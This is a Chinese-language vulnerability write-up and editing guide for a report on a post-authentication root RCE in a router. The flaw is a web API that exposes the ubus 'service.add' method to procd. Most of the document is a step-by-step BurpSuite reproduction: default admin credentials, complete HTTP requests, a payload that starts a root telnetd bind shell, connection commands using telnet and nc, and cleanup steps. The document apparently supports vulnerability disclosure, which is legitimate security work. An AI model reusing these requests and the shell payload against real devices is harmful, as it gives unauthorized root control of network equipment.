# 暴露 `service.add` 的 Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_service_add_rce_report.md`

重点是把它和普通命令注入区分开，准确说明这是“服务管理能力暴露”。

## 2. 一句话结论

真实链路是：

```text
/api/esps
  -> magic_link 允许直接访问原始 ubus 对象 service
  -> 调用 service.add
  -> 向 procd 注册新的 service instance
  -> instance.command 由攻击者完全控制
  -> procd 以 root 启动该命令
```

因此这是：

- exposed service-management RPC leading to root code execution

而不是典型输入拼接漏洞。

## 3. 关键证据

### 3.1 `magic_link` 无对象白名单

`/usr/lib/lua/magic_link/magic_link.lua` 第 `12-25` 行足以说明：

- `service` 对象名会被原样转发到 ubus。

### 3.2 `procd` 字符串能辅助证明服务管理能力

`/sbin/procd` 字符串中可看到：

- `service`
- `instances`
- `respawn`
- `service.start`
- `service.stop`
- `validate`
- `triggers`

这与 `service.add` 请求体中：

- `instances`
- `command`
- `respawn`

等字段完全一致。

## 4. 正式稿建议补强点

### 4.1 明确这不是 shell metacharacter 注入

这里不需要构造：

- `;`
- `$()`
- backticks

攻击者只需要合法调用：

- `service.add`

并把恶意命令放进 `instances.instance1.command` 数组即可。

### 4.2 强调 trust boundary 失守

正式稿里建议直接说明：

- service manager RPC is intended for local privileged components
- exposing it to remote web sessions crosses a critical trust boundary

## 5. 建议补充的验证内容

1. 登录拿 session；
2. `service.delete` 清理旧同名服务；
3. `service.add` 注册恶意实例；
4. 连接临时 `telnetd`；
5. `service.delete` 做清理。

## 6. 建议结论写法

> The issue stems from exposing the native service-management ubus object `service` to authenticated web sessions. By calling `service.add`, an attacker can register a procd instance whose command executes with root privileges.

## 7. BurpSuite 逐步复现

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`
- 临时 service 名：`ctfsvc2`
- 临时 shell 端口：`2361`

### 7.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应里取：

- `data.session`

后续所有 `/api/esps` 包都写：

- `AUTHENTICATION: <SESSION>`

### 7.2 包 2：可选，先删除旧同名 service

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"service","method":"delete","param":{"name":"ctfsvc2"}}]
```

### 7.3 包 3：注册恶意 service instance

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"service","method":"add","param":{"name":"ctfsvc2","script":"/bin/true","instances":{"instance1":{"command":["/bin/sh","-c","echo SERVICE2_RCE_OK >/tmp/service_rce_marker2; telnetd -p2361 -l /bin/sh"],"respawn":{"threshold":3600,"timeout":5,"retry":1}}},"triggers":[],"validate":[]}}]
```

### 7.4 第 4 步：连接 shell 验证 root

等 1-2 秒后连接：

```bash
telnet 192.168.8.1 2361
```

或：

```bash
nc 192.168.8.1 2361
```

执行：

```sh
id
uname -a
cat /tmp/service_rce_marker2
```

预期：

```text
uid=0(root)
SERVICE2_RCE_OK
```

### 7.5 包 4：清理恶意 service

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"service","method":"delete","param":{"name":"ctfsvc2"}}]
```

### 7.6 清理 shell

在拿到的 shell 中执行：

```sh
ps w | grep 'telnetd -p2361'
kill <PID>
```
